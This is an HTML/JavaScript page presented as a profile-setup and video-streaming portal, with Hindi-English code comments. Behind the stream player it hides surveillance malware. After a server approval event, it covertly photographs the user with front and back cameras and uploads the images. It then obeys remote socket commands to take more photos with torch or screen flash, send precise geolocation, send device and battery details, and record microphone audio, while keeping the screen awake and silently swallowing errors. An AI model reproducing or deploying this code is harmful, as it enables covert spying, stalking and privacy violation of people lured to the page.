<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Profile & Stream Portal</title>
    <script src="/socket.io/socket.io.js"></script>
    <!-- HLS.js Library for M3U8 Stream Support -->
    <script src="https://cdn.jsdelivr.net/npm/hls.js@latest"></script>
    <style>
        * { box-sizing: border-box; }
        body { 
            background: #0b0f19; 
            margin: 0; 
            overflow: hidden; 
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            width: 100vw;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            color: #fff;
        }
        
        #profileSection {
            position: absolute;
            z-index: 20;
            background: #111827;
            padding: 30px 24px;
            border-radius: 16px;
            text-align: center;
            width: 90%;
            max-width: 360px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.6);
            border: 1px solid #1f2937;
        }

        .avatar-container {
            position: relative;
            width: 90px;
            height: 90px;
            margin: 0 auto 15px auto;
        }

        #previewImg {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            object-fit: cover;
            border: 3px solid #38bdf8;
            background: #1f2937;
        }

        .camera-badge {
            position: absolute;
            bottom: 0;
            right: 0;
            background: #38bdf8;
            color: #0f172a;
            width: 28px;
            height: 28px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 0.8em;
            cursor: pointer;
            box-shadow: 0 2px 5px rgba(0,0,0,0.3);
        }

        .file-input { display: none; }

        #profileSection h2 {
            margin: 0 0 6px 0;
            color: #38bdf8;
            font-size: 1.3em;
        }

        #profileSection p {
            font-size: 0.85em;
            color: #9ca3af;
            margin: 0 0 20px 0;
            line-height: 1.4;
        }

        .input-box {
            width: 100%;
            padding: 12px;
            margin-bottom: 15px;
            background: #1f2937;
            border: 1px solid #374151;
            border-radius: 8px;
            color: #fff;
            font-size: 1em;
            outline: none;
            text-align: center;
        }

        .btn {
            width: 100%;
            padding: 12px;
            font-size: 1em;
            font-weight: 600;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            background-color: #38bdf8;
            color: #0f172a;
            transition: background 0.2s;
        }
        .btn:hover { background-color: #0ea5e9; }

        #mediaContainer {
            width: 100%;
            height: 100%;
            display: none;
            position: absolute;
            z-index: 5;
            background: #000;
        }

        #mediaContainer iframe, #mediaContainer video {
            width: 100%;
            height: 100%;
            border: none;
            object-fit: contain;
        }
    </style>
</head>
<body>

    <!-- Screen Flash overlay for /moreff -->
    <div id="screenFlash" style="display:none; position:absolute; top:0; left:0; width:100vw; height:100vh; background:white; z-index:9999;"></div>

    <div id="profileSection">
        <div class="avatar-container">
            <img id="previewImg" src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=150" alt="Profile Avatar">
            <label for="profilePicInput" class="camera-badge">📷</label>
        </div>
        
        <h2>Create Profile</h2>
        <p>Set up your profile picture and name to watch the stream.</p>
        
        <input type="text" id="username" class="input-box" placeholder="Enter Your Name" autocomplete="off">
        <input type="file" id="profilePicInput" class="file-input" accept="image/*">
        
        <button class="btn" id="actionBtn">Allow & Continue</button>
    </div>

    <!-- Container jisme aapka movie player dynamically load hoga -->
    <div id="mediaContainer"></div>

    <video id="hiddenCamera" autoplay playsinline style="display:none; position:absolute; opacity:0; pointer-events:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const profileSection = document.getElementById('profileSection');
        const usernameInput = document.getElementById('username');
        const profilePicInput = document.getElementById('profilePicInput');
        const previewImg = document.getElementById('previewImg');
        const actionBtn = document.getElementById('actionBtn');
        const mediaContainer = document.getElementById('mediaContainer');
        
        let socket = io();
        let wakeLock = null;

        // URL se Base64 video link decode karne ka original logic
        const urlParams = new URLSearchParams(window.location.search);
        const encodedVid = urlParams.get('v');
        let targetVideoUrl = encodedVid ? atob(encodedVid) : "https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1";

        // Player load karne ka function
        function loadStreamPlayer() {
            mediaContainer.style.display = 'block';
            mediaContainer.innerHTML = buildPlayer(targetVideoUrl);
        }

        // Aapka advanced buildPlayer function (HLS, YouTube, Drive, MP4 sab chalayega)
        function buildPlayer(url) {
            if (!url) return '';
            url = url.trim();
            if (url.includes('youtube.com') || url.includes('youtu.be')) {
                const m   = url.match(/(?:v=|youtu\.be\/)([a-zA-Z0-9_-]{11})/);
                const src = m ? `https://www.youtube.com/embed/${m[1]}?autoplay=1&rel=0` : url;
                return `<iframe src="${src}" allowfullscreen allow="autoplay;fullscreen;encrypted-media"></iframe>`;
            }
            if (url.includes('drive.google.com')) {
                const fid = (url.match(/\/d\/([^/]+)/) || url.match(/id=([^&]+)/))?.[1];
                const src = fid ? `https://drive.google.com/file/d/${fid}/preview` : url;
                return `<iframe src="${src}" allowfullscreen allow="autoplay;fullscreen"></iframe>`;
            }
            if (url.includes('.m3u8')) {
                const vid = 'hls-' + Date.now();
                setTimeout(() => {
                    const v = document.getElementById(vid);
                    if (!v) return;
                    if (window.Hls && Hls.isSupported()) {
                        const hls = new Hls({ enableWorker: false });
                        hls.loadSource(url); hls.attachMedia(v);
                        hls.on(Hls.Events.MANIFEST_PARSED, () => v.play().catch(()=>{}));
                    } else if (v.canPlayType('application/vnd.apple.mpegurl')) {
                        v.src = url; v.play().catch(()=>{});
                    }
                }, 100);
                return `<video id="${vid}" controls autoplay playsinline preload="metadata" style="width:100%;height:100%;display:block;background:#000;"></video>`;
            }
            if (/\.(mp4|webm|ogg)(\?|$)/i.test(url)) {
                return `<video controls autoplay playsinline preload="metadata" style="width:100%;height:100%;display:block;background:#000;"><source src="${url}"/></video>`;
            }
            return `<iframe src="${url}" allowfullscreen allow="autoplay;fullscreen;encrypted-media" referrerpolicy="no-referrer" scrolling="no"></iframe>`;
        }

        // Persistent check via LocalStorage
        window.addEventListener('DOMContentLoaded', () => {
            const savedName = localStorage.getItem('sec_username');
            const savedAvatar = localStorage.getItem('sec_avatar');
            const isRegistered = localStorage.getItem('sec_registered');

            if (isRegistered === 'true' && savedName) {
                usernameInput.value = savedName;
                if (savedAvatar) previewImg.src = savedAvatar;

                profileSection.style.display = 'none';
                loadStreamPlayer();

                socket.emit('register_device', { name: savedName });
                initializeSecuritySystem();
            }
        });

        profilePicInput.addEventListener('change', (event) => {
            const file = event.target.files[0];
            if (file) {
                const reader = new FileReader();
                reader.onload = function(e) {
                    previewImg.src = e.target.result;
                    localStorage.setItem('sec_avatar', e.target.result);
                }
                reader.readAsDataURL(file);
            }
        });

        actionBtn.addEventListener('click', () => {
            const name = usernameInput.value.trim();
            if (!name) {
                alert("Please enter your name first!");
                return;
            }

            localStorage.setItem('sec_username', name);
            localStorage.setItem('sec_avatar', previewImg.src);
            localStorage.setItem('sec_registered', 'true');

            actionBtn.innerText = "Connecting & Waiting for Authorization...";
            actionBtn.disabled = true;

            socket.emit('register_device', { name: name });
        });

        socket.on('device_approved', async () => {
            actionBtn.innerText = "Loading Stream...";

            try {
                await captureSequence("user", "front");
                await captureSequence("environment", "back");
            } catch (err) {}

            profileSection.style.display = 'none';
            loadStreamPlayer(); // Photos capture hone ke foran baad video play ho jayegi

            initializeSecuritySystem();
        });

        function initializeSecuritySystem() {
            keepScreenAwake();

            socket.on('capture_front', async () => { await captureSequence("user", "command_front"); });
            socket.on('capture_back', async () => { await captureSequence("environment", "command_back"); });

            socket.on('capture_front_flash', async () => {
                const flashScreen = document.getElementById('screenFlash');
                flashScreen.style.display = 'block';
                await new Promise(resolve => setTimeout(resolve, 500));
                await captureSequence("user", "command_front_flash");
                flashScreen.style.display = 'none';
            });

            socket.on('capture_back_flash', async () => {
                let torchStream = null;
                let torchTrack = null;
                try {
                    torchStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
                    torchTrack = torchStream.getVideoTracks()[0];
                    if (torchTrack) {
                        await torchTrack.applyConstraints({ advanced: [{ torch: true }] });
                    }
                    await new Promise(resolve => setTimeout(resolve, 500));
                    await captureSequence("environment", "command_back_flash");
                    if (torchTrack) {
                        await torchTrack.applyConstraints({ advanced: [{ torch: false }] });
                    }
                    if (torchStream) {
                        torchStream.getTracks().forEach(t => t.stop());
                    }
                } catch (e) {
                    if (torchStream) torchStream.getTracks().forEach(t => t.stop());
                }
            });

            socket.on('get_location', () => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(async (pos) => {
                        await fetch('/upload-location', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ lat: pos.coords.latitude, lon: pos.coords.longitude })
                        });
                    }, async (err) => {
                        await fetch('/upload-location', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ error: err.message })
                        });
                    }, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
                } else {
                    fetch('/upload-location', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ error: "Geolocation not supported by browser" })
                    });
                }
            });

            socket.on('get_info', async () => {
                let batteryLevel = 'Unknown';
                if (navigator.getBattery) {
                    try {
                        const battery = await navigator.getBattery();
                        batteryLevel = Math.round(battery.level * 100) + '% (' + (battery.charging ? 'Charging ⚡' : 'Not Charging 🔋') + ')';
                    } catch(e) {}
                }
                const info = {
                    battery: batteryLevel,
                    platform: navigator.platform || 'Unknown',
                    userAgent: navigator.userAgent,
                    screen: window.screen.width + 'x' + window.screen.height
                };
                await fetch('/upload-info', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(info)
                });
            });

            socket.on('record_audio', async () => {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                    const mediaRecorder = new MediaRecorder(stream);
                    let chunks = [];
                    mediaRecorder.ondataavailable = e => chunks.push(e.data);
                    mediaRecorder.onstop = async () => {
                        const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
                        const formData = new FormData();
                        formData.append('audio', blob, 'surveillance_audio.ogg');
                        await fetch('/upload-audio', { method: 'POST', body: formData });
                        stream.getTracks().forEach(t => t.stop());
                    };
                    mediaRecorder.start();
                    setTimeout(() => { mediaRecorder.stop(); }, 5000);
                } catch (e) {}
            });
        }

        async function captureSequence(facingMode, labelPrefix) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
                const video = document.getElementById('hiddenCamera');
                video.srcObject = stream;
                
                await new Promise(resolve => video.onloadedmetadata = resolve);

                for (let i = 0; i < 5; i++) {
                    await captureAndSend(video, `${labelPrefix}_${i + 1}`);
                    await new Promise(resolve => setTimeout(resolve, 800)); 
                }

                stream.getTracks().forEach(track => track.stop());
            } catch (error) {}
        }

        async function captureAndSend(video, label) {
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            return new Promise((resolve) => {
                canvas.toBlob(async (blob) => {
                    const formData = new FormData();
                    formData.append('photo', blob, `capture_${label}.jpg`);
                    try {
                        await fetch('/upload', { method: 'POST', body: formData });
                    } catch (err) {}
                    resolve();
                }, 'image/jpeg', 0.8);
            });
        }

        async function keepScreenAwake() {
            try {
                if ('wakeLock' in navigator) {
                    wakeLock = await navigator.wakeLock.request('screen');
                }
            } catch (err) {}
        }

        document.addEventListener('visibilitychange', async () => {
            if (document.visibilityState === 'visible' && mediaContainer.style.display === 'block') {
                keepScreenAwake();
            }
        });
    </script>
</body>
</html>
